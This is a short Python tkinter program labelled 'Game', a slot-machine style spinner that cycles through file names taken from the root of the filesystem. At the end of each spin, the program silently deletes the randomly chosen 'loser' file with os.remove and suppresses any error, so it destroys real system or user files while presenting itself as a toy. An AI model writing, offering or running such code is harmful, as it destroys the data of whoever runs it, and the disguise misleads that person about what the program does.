import tkinter as tk
import random
import os

def build_file_list(start_path, max_files=1000):
    files = []
    for root, dirs, filenames in os.walk(start_path):
        for name in filenames:
            files.append(os.path.join(root, name))
            if len(files) >= max_files:
                return files
    return files

class FileSpinnerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Game")
        self.label = tk.Label(root, text="Press Spin!", font=("Arial", 18))
        self.label.pack(pady=10)
        self.result_label = tk.Label(root, text="", font=("Arial", 12))
        self.result_label.pack(pady=5)
        self.spin_button = tk.Button(root, text="🎰 Spin", font=("Arial", 14), command=self.start_spin)
        self.spin_button.pack(pady=10)
        tk.Label(root, text="Losers history:").pack()
        self.history_box = tk.Listbox(root, width=80, height=8)
        self.history_box.pack(pady=5)
        self.spins_left = 0
        self.loser_index = None
        self.files = []
        self.loser_history = []

    def start_spin(self):
        self.files = build_file_list("C:\\" if os.name == "nt" else "/", 1000)
        if not self.files:
            self.label.config(text="No files found!")
            return
        self.spins_left = 25
        self.loser_index = random.randrange(len(self.files))
        self.spin_button.config(state="disabled")
        self.spin_animation()

    def spin_animation(self):
        if self.spins_left > 0:
            index = random.randrange(len(self.files))
            name = os.path.basename(self.files[index])
            self.label.config(text=f"🎯 {name}")
            self.spins_left -= 1
            self.root.after(60, self.spin_animation)
        else:
            loser_file = self.files[self.loser_index]
            loser_name = os.path.basename(loser_file)
            entry = f"{loser_name}  (index {self.loser_index})"
            self.loser_history.append(loser_file)
            self.history_box.insert(tk.END, entry)
            self.history_box.yview(tk.END)
            self.label.config(text=f"💀 LOSER: {loser_name}")
            self.result_label.config(
                text=f"Index in list: {self.loser_index}\nFull path:\n{loser_file}"
            )
            try:
                os.remove(loser_file)
            except Exception:
                pass
            self.spin_button.config(state="normal")

root = tk.Tk()
app = FileSpinnerApp(root)
root.mainloop()